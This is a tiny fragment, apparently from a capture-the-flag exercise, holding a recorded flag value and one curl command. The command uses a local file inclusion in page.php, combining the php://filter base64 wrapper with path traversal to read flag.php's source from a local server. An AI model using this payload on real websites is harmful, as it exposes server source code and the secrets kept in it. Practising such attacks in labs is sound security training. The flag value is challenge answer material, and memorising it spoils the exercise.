flag = "flag_bb4e38d4f760c434ee58cfaf9d503437"


curl http://localhost:8002/pages/page.php?f=php://filter/convert.base64-encode/resource=../somerandomtext/flag.php | base64 -d
